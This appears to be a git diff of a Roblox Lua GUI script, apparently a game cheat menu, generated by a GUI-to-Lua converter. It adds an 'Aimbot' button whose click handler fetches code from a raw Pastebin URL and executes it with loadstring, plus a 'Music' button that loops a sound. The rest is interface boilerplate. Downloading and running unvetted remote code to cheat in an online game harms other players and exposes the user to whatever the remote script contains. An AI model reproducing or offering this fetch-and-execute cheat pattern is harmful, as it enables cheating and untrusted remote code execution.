@@ -7,7 +7,7 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 20 | Scripts: 8 | Modules: 0 | Tags: 0
+-- Instances: 24 | Scripts: 10 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.ScreenGui
@@ -21,7 +21,7 @@ G2L["2"] = Instance.new("Frame", G2L["1"]);
 G2L["2"]["BorderSizePixel"] = 5;
 G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["2"]["Size"] = UDim2.new(0, 687, 0, 342);
-G2L["2"]["Position"] = UDim2.new(0.05897, 0, 0.10083, 0);
+G2L["2"]["Position"] = UDim2.new(0.05791, 0, 0.113, 0);
 G2L["2"]["BorderColor3"] = Color3.fromRGB(255, 0, 5);
 
 
@@ -191,6 +191,42 @@ G2L["13"]["Position"] = UDim2.new(0.18632, 0, 0.35673, 0);
 
 -- StarterGui.ScreenGui.Frame.TextButton.LocalScript
 G2L["14"] = Instance.new("LocalScript", G2L["13"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.TextButton
+G2L["15"] = Instance.new("TextButton", G2L["2"]);
+G2L["15"]["BorderSizePixel"] = 2;
+G2L["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["15"]["TextSize"] = 14;
+G2L["15"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["15"]["Size"] = UDim2.new(0, 107, 0, 50);
+G2L["15"]["BorderColor3"] = Color3.fromRGB(255, 0, 5);
+G2L["15"]["Text"] = [[Aimbot]];
+G2L["15"]["Position"] = UDim2.new(0.18632, 0, 0.53216, 0);
+
+
+-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
+G2L["16"] = Instance.new("LocalScript", G2L["15"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.TextButton
+G2L["17"] = Instance.new("TextButton", G2L["2"]);
+G2L["17"]["BorderSizePixel"] = 2;
+G2L["17"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17"]["TextSize"] = 14;
+G2L["17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["17"]["Size"] = UDim2.new(0, 107, 0, 50);
+G2L["17"]["BorderColor3"] = Color3.fromRGB(255, 0, 5);
+G2L["17"]["Text"] = [[Music]];
+G2L["17"]["Position"] = UDim2.new(0.18632, 0, 0.71345, 0);
+
+
+-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
+G2L["18"] = Instance.new("LocalScript", G2L["17"]);
 
 
 
@@ -421,5 +457,33 @@ local script = G2L["14"];
 	
 end;
 task.spawn(C_14);
+-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
+local function C_16()
+local script = G2L["16"];
+	local button=script.Parent
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/b8QDUqJ8"))()
+	end)
+end;
+task.spawn(C_16);
+-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
+local function C_18()
+local script = G2L["18"];
+	local button = script.Parent
+	
+	-- Create and configure the sound
+	local sound = Instance.new("Sound", button)
+	sound.SoundId = "rbxassetid://1846924681" -- Sound ID (Button Click)
+	sound.Volume = 1
+	sound.PlayOnRemove = true 
+	sound.Looped=true -- Instantly plays when removed
+	
+	-- Connect the button click to the sound
+	button.MouseButton1Click:Connect(function()
+		sound:Play()
+	end)
+	
+end;
+task.spawn(C_18);
 
 return G2L["1"], require;
